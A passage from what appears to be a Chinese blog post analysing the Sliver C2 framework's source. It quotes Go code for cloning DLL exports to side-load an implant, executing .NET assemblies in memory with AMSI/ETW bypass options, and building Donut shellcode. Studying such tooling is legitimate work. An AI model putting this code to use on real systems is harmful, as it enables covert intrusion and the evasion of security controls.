(%s)"</span>, session<span class="selector-class">.OS</span>,</div><div class="line">		))</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="comment">// download reference DLL if we don't have one in the request</span></div><div class="line">	<span class="keyword">if</span> len(req.ReferenceDLL) == <span class="number">0</span> &#123;</div><div class="line">		download, err := rpc.Download(context.Background(), &amp;sliverpb.DownloadReq&#123;</div><div class="line">			Request: &amp;commonpb.Request&#123;</div><div class="line">				SessionID: session<span class="selector-class">.ID</span>,</div><div class="line">				Timeout:   int64(<span class="number">30</span>),</div><div class="line">			&#125;,</div><div class="line">			Path: req<span class="selector-class">.ReferenceDLLPath</span>,</div><div class="line">		&#125;)</div><div class="line">		<span class="keyword">if</span> err != nil &#123;</div><div class="line">			return nil, status.Error(codes<span class="selector-class">.InvalidArgument</span>, fmt.Sprintf(</div><div class="line">				<span class="string">"could not download the reference DLL: %s"</span>, err.Error(),</div><div class="line">			))</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> download<span class="selector-class">.Encoder</span> == <span class="string">"gzip"</span> &#123;</div><div class="line">			download<span class="selector-class">.Data</span>, err = new(encoders.Gzip).Decode(download.Data)</div><div class="line">			<span class="keyword">if</span> err != nil &#123;</div><div class="line">				return nil, err</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		refDLL = download.Data</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		refDLL = req.ReferenceDLL</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> req<span class="selector-class">.ProfileName</span> != <span class="string">""</span> &#123;</div><div class="line">		profiles, err := rpc.ImplantProfiles(context.Background(), &amp;commonpb.Empty&#123;&#125;)</div><div class="line">		<span class="keyword">if</span> err != nil &#123;</div><div class="line">			return nil, err</div><div class="line">		&#125;</div><div class="line">		<span class="selector-tag">var</span> <span class="selector-tag">p</span> *clientpb.ImplantProfile</div><div class="line">		<span class="keyword">for</span> _, prof := range profiles<span class="selector-class">.Profiles</span> &#123;</div><div class="line">			<span class="keyword">if</span> prof<span class="selector-class">.Name</span> == req<span class="selector-class">.ProfileName</span> &#123;</div><div class="line">				<span class="selector-tag">p</span> = prof</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> <span class="selector-tag">p</span>.GetName() == <span class="string">""</span> &#123;</div><div class="line">			return nil, status.Error(codes<span class="selector-class">.InvalidArgument</span>, fmt.Sprintf(</div><div class="line">				<span class="string">"no profile found for name %s"</span>, req<span class="selector-class">.ProfileName</span>,</div><div class="line">			))</div><div class="line">		&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">		<span class="keyword">if</span> <span class="selector-tag">p</span><span class="selector-class">.Config</span><span class="selector-class">.Format</span> != clientpb<span class="selector-class">.OutputFormat_SHARED_LIB</span> &#123;</div><div class="line">			return nil, status.Error(codes<span class="selector-class">.InvalidArgument</span>,</div><div class="line">				<span class="string">"please select a profile targeting a shared library format"</span>,</div><div class="line">			)</div><div class="line">		&#125;</div><div class="line">		name, config := generate.ImplantConfigFromProtobuf(<span class="selector-tag">p</span>.Config)</div><div class="line">		<span class="keyword">if</span> name == <span class="string">""</span> &#123;</div><div class="line">			name, err = codenames.GetCodename()</div><div class="line">			<span class="keyword">if</span> err != nil &#123;</div><div class="line">				return nil, err</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		otpSecret, _ := cryptography.TOTPServerSecret()</div><div class="line">		err = generate.GenerateConfig(name, config, true)</div><div class="line">		<span class="keyword">if</span> err != nil &#123;</div><div class="line">			return nil, err</div><div class="line">		&#125;</div><div class="line">		fPath, err := generate.SliverSharedLibrary(name, otpSecret, config, true)</div><div class="line">		<span class="keyword">if</span> err != nil &#123;</div><div class="line">			return nil, err</div><div class="line">		&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">		targetDLLData, err = os.ReadFile(fPath)</div><div class="line">		<span class="keyword">if</span> err != nil &#123;</div><div class="line">			return nil, err</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">if</span> len(req.TargetDLL) == <span class="number">0</span> &#123;</div><div class="line">			return nil, errors.New(<span class="string">"missing target DLL"</span>)</div><div class="line">		&#125;</div><div class="line">		targetDLLData = req.TargetDLL</div><div class="line">	&#125;</div><div class="line">	<span class="comment">// call clone</span></div><div class="line">	result, err := cloneExports(targetDLLData, refDLL, req.ReferenceDLLPath)</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		return resp, fmt.Errorf(<span class="string">"failed to clone exports: %s"</span>, err)</div><div class="line">	&#125;</div><div class="line">	targetBytes, err := result.Bytes()</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		return resp, fmt.Errorf(<span class="string">"failed to convert PE to bytes: %s"</span>, err)</div><div class="line">	&#125;</div><div class="line">	<span class="comment">// upload new dll</span></div><div class="line">	uploadGzip := new(encoders.Gzip).Encode(targetBytes)</div><div class="line">	<span class="comment">// upload to remote target</span></div><div class="line">	upload, err := rpc.Upload(context.Background(), &amp;sliverpb.UploadReq&#123;</div><div class="line">		Encoder: <span class="string">"gzip"</span>,</div><div class="line">		Data:    uploadGzip,</div><div class="line">		Path:    req<span class="selector-class">.TargetLocation</span>,</div><div class="line">		Request: &amp;commonpb.Request&#123;</div><div class="line">			SessionID: session<span class="selector-class">.ID</span>,</div><div class="line">			Timeout:   int64(minTimeout),</div><div class="line">		&#125;,</div><div class="line">	&#125;)</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		return nil, err</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">if</span> upload<span class="selector-class">.Response</span> != nil &amp;&amp; upload<span class="selector-class">.Response</span><span class="selector-class">.Err</span> != <span class="string">""</span> &#123;</div><div class="line">		return nil, fmt.Errorf(upload<span class="selector-class">.Response</span><span class="selector-class">.Err</span>)</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	return resp, nil</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>cloneExports</code>方法中。<code>cloneExports</code>主要逻辑就是在目标dll中新增一个节区，重新制作导出表，实现侧加载。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">cloneExports</span><span class="params">(targetPE []<span class="keyword">byte</span>, referencePE []<span class="keyword">byte</span>, refPath <span class="keyword">string</span>)</span> <span class="params">(*pe.File, error)</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">var</span> (</div><div class="line">		tgt                = bytes.NewReader(targetPE)</div><div class="line">		ref                = bytes.NewReader(referencePE)</div><div class="line">		refExportDirectory pe.DataDirectory</div><div class="line">	)</div><div class="line">	refPath = strings.ReplaceAll(refPath, <span class="string">".dll"</span>, <span class="string">""</span>)</div><div class="line">	tgtFile, err := pe.NewFile(tgt)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	refFile, err := pe.NewFile(ref)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">switch</span> hdr := (refFile.OptionalHeader).(<span class="keyword">type</span>) &#123;</div><div class="line">	<span class="keyword">case</span> *pe.OptionalHeader32:</div><div class="line">		refExportDirectory = hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]</div><div class="line">	<span class="keyword">case</span> *pe.OptionalHeader64:</div><div class="line">		refExportDirectory = hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]</div><div class="line">	&#125;</div><div class="line">	refExports, err := refFile.Exports()</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(refExports) == <span class="number">0</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">"reference binary has no exports"</span>)</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">var</span> exportNames []<span class="keyword">string</span></div><div class="line">	<span class="keyword">for</span> _, exp := <span class="keyword">range</span> refExports &#123;</div><div class="line">		<span class="keyword">var</span> newName <span class="keyword">string</span></div><div class="line">		<span class="keyword">if</span> exp.Name != <span class="string">""</span> &#123;</div><div class="line">			newName = fmt.Sprintf(<span class="string">"%s.%s"</span>, refPath, exp.Name)</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			newName = fmt.Sprintf(<span class="string">"%s.#%d"</span>, refPath, exp.Ordinal)</div><div class="line">		&#125;</div><div class="line">		exportNames = <span class="built_in">append</span>(exportNames, newName)</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	tgtFile.DosStub = refFile.DosStub</div><div class="line">	exportNamesBlob := strings.Join(exportNames, <span class="string">"\x00"</span>)</div><div class="line">	exportNamesBlob += <span class="string">"\x00"</span></div><div class="line">	forwardNameBlock := []<span class="keyword">byte</span>(exportNamesBlob)</div><div class="line">	newSectionSize := refExportDirectory.Size + <span class="keyword">uint32</span>(<span class="built_in">len</span>(exportNamesBlob))</div><div class="line">	newSection, err := addSection(tgtFile, <span class="string">".rdata2"</span>, <span class="keyword">uint32</span>(newSectionSize))</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="comment">// Update the export directory size and virtual address</span></div><div class="line">	<span class="keyword">switch</span> hdr := (tgtFile.OptionalHeader).(<span class="keyword">type</span>) &#123;</div><div class="line">	<span class="keyword">case</span> *pe.OptionalHeader32:</div><div class="line">		hdr.DataDirectory[<span class="number">0</span>].VirtualAddress = newSection.VirtualAddress</div><div class="line">		hdr.DataDirectory[<span class="number">0</span>].Size = newSectionSize</div><div class="line">	<span class="keyword">case</span> *pe.OptionalHeader64:</div><div class="line">		hdr.DataDirectory[<span class="number">0</span>].VirtualAddress = newSection.VirtualAddress</div><div class="line">		hdr.DataDirectory[<span class="number">0</span>].Size = newSectionSize</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	delta := newSection.VirtualAddress - refExportDirectory.VirtualAddress</div><div class="line">	exportDirOffset := refFile.RVAToFileOffset(refExportDirectory.VirtualAddress)</div><div class="line">	sectionData := <span class="built_in">make</span>([]<span class="keyword">byte</span>, newSection.Size)</div><div class="line">	<span class="comment">// Write the new export table into the section</span></div><div class="line">	n := <span class="built_in">copy</span>(sectionData, referencePE[exportDirOffset:exportDirOffset+refExportDirectory.Size])</div><div class="line">	<span class="keyword">if</span> n &lt; <span class="keyword">int</span>(refExportDirectory.Size) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"only copied %d bytes"</span>, n)</div><div class="line">	&#125;</div><div class="line">	<span class="comment">// Write the forward name block</span></div><div class="line">	n = <span class="built_in">copy</span>(sectionData[refExportDirectory.Size:], forwardNameBlock)</div><div class="line">	<span class="keyword">if</span> n &lt; <span class="keyword">int</span>(refExportDirectory.Size) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"only copied %d bytes"</span>, n)</div><div class="line">	&#125;</div><div class="line">	<span class="comment">// Update the section data</span></div><div class="line">	sectionDataReader := bytes.NewReader(sectionData)</div><div class="line">	tgtFile.Section(newSection.Name).Replace(sectionDataReader, <span class="keyword">int64</span>(<span class="built_in">len</span>(sectionData)))</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="comment">// Get the updated byte slice representation of the target file</span></div><div class="line">	tgtBytes, err := tgtFile.Bytes()</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="comment">// We're not using pe.ExportDirectory because it contains a string field (DllName)</span></div><div class="line">	<span class="comment">// which makes it unusable with binary.Read, and I did not want to manually parse</span></div><div class="line">	<span class="comment">// all the fields because I'm lazy.</span></div><div class="line">	newExportDirectory := exportDirectory&#123;&#125;</div><div class="line">	err = binary.Read(bytes.NewReader(tgtBytes[newSection.Offset:]), binary.LittleEndian, &amp;newExportDirectory)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">	&#125;</div><div class="line">	<span class="comment">// Update the export directory</span></div><div class="line">	newExportDirectory.AddressTableAddr += delta</div><div class="line">	newExportDirectory.NameTableAddr += delta</div><div class="line">	newExportDirectory.OrdinalTableAddr += delta</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="comment">// Write it back to the target file byte slice</span></div><div class="line">	buf := <span class="built_in">new</span>(bytes.Buffer)</div><div class="line">	err = binary.Write(buf, binary.LittleEndian, &amp;newExportDirectory)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">	&#125;</div><div class="line">	n = <span class="built_in">copy</span>(tgtBytes[newSection.Offset:], buf.Bytes())</div><div class="line">	<span class="keyword">if</span> n &lt; buf.Len() &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"only read %d bytes, expected %d"</span>, n, buf.Len())</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="comment">// Link function addresses to forward names</span></div><div class="line">	forwardOffset := newSection.VirtualAddress + refExportDirectory.Size</div><div class="line">	rawAddressOfFunctions := tgtFile.RVAToFileOffset(newExportDirectory.AddressTableAddr)</div><div class="line">	<span class="keyword">for</span> i := <span class="keyword">uint32</span>(<span class="number">0</span>); i &lt; newExportDirectory.NumberOfFunctions; i++ &#123;</div><div class="line">		offset := rawAddressOfFunctions + (<span class="number">4</span> * i)</div><div class="line">		forwardName := exportNames[i]</div><div class="line">		binary.LittleEndian.PutUint32(tgtBytes[offset:], forwardOffset)</div><div class="line">		forwardOffset += <span class="keyword">uint32</span>(<span class="built_in">len</span>(forwardName) + <span class="number">1</span>)</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="comment">// Apply delta to export names</span></div><div class="line">	rawAddressOfNames := tgtFile.RVAToFileOffset(newExportDirectory.NameTableAddr)</div><div class="line">	<span class="keyword">for</span> i := <span class="keyword">uint32</span>(<span class="number">0</span>); i &lt; newExportDirectory.NumberOfNames; i++ &#123;</div><div class="line">		offset := rawAddressOfNames + (<span class="number">4</span> * i)</div><div class="line">		data := binary.LittleEndian.Uint32(tgtBytes[offset:])</div><div class="line">		binary.LittleEndian.PutUint32(tgtBytes[offset:], (data + delta))</div><div class="line">	&#125;</div><div class="line">	<span class="comment">// Return the new pe.File</span></div><div class="line">	<span class="keyword">return</span> pe.NewFile(bytes.NewReader(tgtBytes))</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x03-ExecuteAssembly"><a href="#0x03-ExecuteAssembly" class="headerlink" title="0x03 ExecuteAssembly"></a>0x03 ExecuteAssembly</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ExecuteAssembly的作用是内存执行Donot文件。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>https://github.com/BishopFox/sliver/blob/v1.5.30/server/rpc/rpc-tasks.go</code>的<code>ExecuteAssembly</code>是<code>ExecuteAssembly</code>的Main函数，首先会调用位于<code>https://github.com/BishopFox/sliver/blob/a8a36dd6e2c9796c51ab6983b5b615d19c6a6995/server/generate/donut.go</code>的<code>DonutFromAssembly</code>函数填充一些诸如<code>donutArch</code> , <code>Method</code>配置文件,然后填充ShellCode。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">func (rpc *Server) ExecuteAssembly(ctx context<span class="selector-class">.Context</span>, req *sliverpb.ExecuteAssemblyReq) (*sliverpb<span class="selector-class">.ExecuteAssembly</span>, error) </div><div class="line">&#123;</div><div class="line">[....]</div><div class="line">	shellcode, err := generate.DonutFromAssembly(</div><div class="line">		req<span class="selector-class">.Assembly</span>,</div><div class="line">		req<span class="selector-class">.IsDLL</span>,</div><div class="line">		req<span class="selector-class">.Arch</span>,</div><div class="line">		req<span class="selector-class">.Arguments</span>,</div><div class="line">		req<span class="selector-class">.Method</span>,</div><div class="line">		req<span class="selector-class">.ClassName</span>,</div><div class="line">		req<span class="selector-class">.AppDomain</span>,</div><div class="line">	)</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		tasksLog.Errorf(<span class="string">"Execute assembly failed: %s"</span>, err)</div><div class="line">		return nil, err</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	resp := &amp;sliverpb.ExecuteAssembly&#123;Response: &amp;commonpb.Response&#123;&#125;&#125;</div><div class="line">	<span class="keyword">if</span> req<span class="selector-class">.InProcess</span> &#123;</div><div class="line">		tasksLog.Infof(<span class="string">"Executing assembly in-process"</span>)</div><div class="line">		invokeInProcExecAssembly := &amp;sliverpb.InvokeInProcExecuteAssemblyReq&#123;</div><div class="line">			Data:       req<span class="selector-class">.Assembly</span>,</div><div class="line">			Runtime:    req<span class="selector-class">.Runtime</span>,</div><div class="line">			Arguments:  strings.Split(req<span class="selector-class">.Arguments</span>, <span class="string">" "</span>),</div><div class="line">			AmsiBypass: req<span class="selector-class">.AmsiBypass</span>,</div><div class="line">			EtwBypass:  req<span class="selector-class">.EtwBypass</span>,</div><div class="line">			Request:    req<span class="selector-class">.Request</span>,</div><div class="line">		&#125;</div><div class="line">		err = rpc.GenericHandler(invokeInProcExecAssembly, resp)</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		invokeExecAssembly := &amp;sliverpb.InvokeExecuteAssemblyReq&#123;</div><div class="line">			Data:        shellcode,</div><div class="line">			Process:     req<span class="selector-class">.Process</span>,</div><div class="line">			Request:     req<span class="selector-class">.Request</span>,</div><div class="line">			PPid:        req<span class="selector-class">.PPid</span>,</div><div class="line">			ProcessArgs: req<span class="selector-class">.ProcessArgs</span>,</div><div class="line">		&#125;</div><div class="line">		err = rpc.GenericHandler(invokeExecAssembly, resp)</div><div class="line"><span class="comment">//</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		return nil, err</div><div class="line">	&#125;</div><div class="line">	return resp, nil</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ShellCode的生成逻辑是这样的，在<code>https://github.com/BishopFox/sliver/blob/a8a36dd6e2c9796c51ab6983b5b615d19c6a6995/vendor/github.com/Binject/go-donut/donut/donut.go</code>Sandwich函数生成的ShellCode主要包含3部分：<code>shellcode_loader</code>,<code>donut_loader</code>,<code>payload(C#Assembly)</code>。shellcode_loader负责引导eip执行donut_loader，需要跳转payload大小(SizeOf(payload))后执行donut_loader。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sandwich</span><span class="params">(arch DonutArch, payload *bytes.Buffer)</span> <span class="params">(*bytes.Buffer, error)</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="comment">/*</span></div><div class="line"><span class="comment">			Disassembly:</span></div><div class="line"><span class="comment">					   0:  e8 					call $+</span></div><div class="line"><span class="comment">					   1:  xx xx xx xx			instance length</span></div><div class="line"><span class="comment">					   5:  [instance]</span></div><div class="line"><span class="comment">		 x=5+instanceLen:  0x59					pop ecx</span></div><div class="line"><span class="comment">		             x+1:  stub preamble + stub (either 32 or 64 bit or both)</span></div><div class="line"><span class="comment">	*/</span></div><div class="line">	w := <span class="built_in">new</span>(bytes.Buffer)</div><div class="line">	instanceLen := <span class="keyword">uint32</span>(payload.Len())</div><div class="line">	w.WriteByte(<span class="number">0xE8</span>)</div><div class="line">	binary.Write(w, binary.LittleEndian, instanceLen)</div><div class="line">	<span class="keyword">if</span> _, err := payload.WriteTo(w); err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">	&#125;</div><div class="line">	w.WriteByte(<span class="number">0x59</span>)</div><div class="line">	picLen := <span class="keyword">int</span>(instanceLen) + <span class="number">32</span></div><div class="line">	<span class="keyword">switch</span> arch &#123;</div><div class="line">	<span class="keyword">case</span> X32:</div><div class="line">		w.WriteByte(<span class="number">0x5A</span>) <span class="comment">// preamble: pop edx, push ecx, push edx</span></div><div class="line">		w.WriteByte(<span class="number">0x51</span>)</div><div class="line">		w.WriteByte(<span class="number">0x52</span>)</div><div class="line">		w.Write(LOADER_EXE_X86)</div><div class="line">		picLen += <span class="built_in">len</span>(LOADER_EXE_X86)</div><div class="line">	<span class="keyword">case</span> X64:</div><div class="line">		w.Write(LOADER_EXE_X64)</div><div class="line">		picLen += <span class="built_in">len</span>(LOADER_EXE_X64)</div><div class="line">	<span class="keyword">case</span> X84:</div><div class="line">		w.WriteByte(<span class="number">0x31</span>) <span class="comment">// preamble: xor eax,eax</span></div><div class="line">		w.WriteByte(<span class="number">0xC0</span>)</div><div class="line">		w.WriteByte(<span class="number">0x48</span>) <span class="comment">// dec ecx</span></div><div class="line">		w.WriteByte(<span class="number">0x0F</span>) <span class="comment">// js dword x86_code (skips length of x64 code)</span></div><div class="line">		w.WriteByte(<span class="number">0x88</span>)</div><div class="line">		binary.Write(w, binary.LittleEndian, <span class="keyword">uint32</span>(<span class="built_in">len</span>(LOADER_EXE_X64)))</div><div class="line">		w.Write(LOADER_EXE_X64)</div><div class="line">		w.Write([]<span class="keyword">byte</span>&#123;<span class="number">0x5A</span>, <span class="comment">// in between 32/64 stubs: pop edx</span></div><div class="line">			<span class="number">0x51</span>,  <span class="comment">// push ecx</span></div><div class="line">			<span class="number">0x52</span>&#125;) <span class="comment">// push edx</span></div><div class="line">		w.Write(LOADER_EXE_X86)</div><div class="line">		picLen += <span class="built_in">len</span>(LOADER_EXE_X86)</div><div class="line">		picLen += <span class="built_in">len</span>(LOADER_EXE_X64)</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	lb := w.Len()</div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; picLen-lb; i++ &#123;</div><div class="line">		w.WriteByte(<span class="number">0x0</span>)</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">return</span> w, <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;donut_loader是一段ShellCode，其代码位于<a href="https://github.com/TheWover/donut/blob/master/loader/loader.c" target="_blank" rel="external">https://github.com/TheWover/donut/blob/master/loader/loader.c</a>原理如下：</p>
+<ul>
+<li>1&gt; 加载CLR环境</li>
+<li>2&gt; 获取程序域</li>
+<li>3&gt; 装载程序集</li>
+<li>4&gt; 执行程序集</li>
+</ul>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/BishopFox/sliver/blob/v1.<span class="number">5.30</span>/client/<span class="keyword">command</span>/exec/<span class="keyword">execute</span>-assembly.<span class="keyword">go</span></div><div class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/BishopFox/sliver/blob/v1.<span class="number">5.30</span>/server/rpc/rpc-tasks.<span class="keyword">go</span></div><div class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/BishopFox/sliver/blob/a8a36dd6e2c9796c51ab6983b5b615d19c6a6995/server/generate/donut.go#L57</div><div class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/BishopFox/sliver/blob/a8a36dd6e2c9796c51ab6983b5b615d19c6a6995/vendor/github.<span class="keyword">com</span>/Binject/<span class="keyword">go</span>-donut/donut/donut.go#L85</div><div class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/BishopFox/sliver/blob/a8a36dd6e2/vendor/github.<span class="keyword">com</span>/Binject/<span class="keyword">go</span>-donut/donut/loader_exe_x86.<span class="keyword">go</span></div><div class="line">http<span class="variable">s:</span>//github.<span class="keyword">com</span>/TheWover/donut/blob/master/loader/loader.<span class="keyword">c</span></div></pre></td></tr></table></figure>
+<h3 id="0x04-getprivs"><a href="#0x04-getprivs" class="headerlink" title="0x04 getprivs"></a>0x04 getprivs</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>https://github.com/BishopFox/sliver/blob/a8a36dd6e2/implant/sliver/priv/priv_windows.go</code>的getprivs作用是根据进程句柄获取进程权限信息，主要分5步</p>
+<ul>
+<li>1）通过<code>GetCurrentProcess</code>获取当前进程Handle。</li>
+<li>2）通过<code>OpenProcessToken</code>打开当前进程Token句柄。</li>
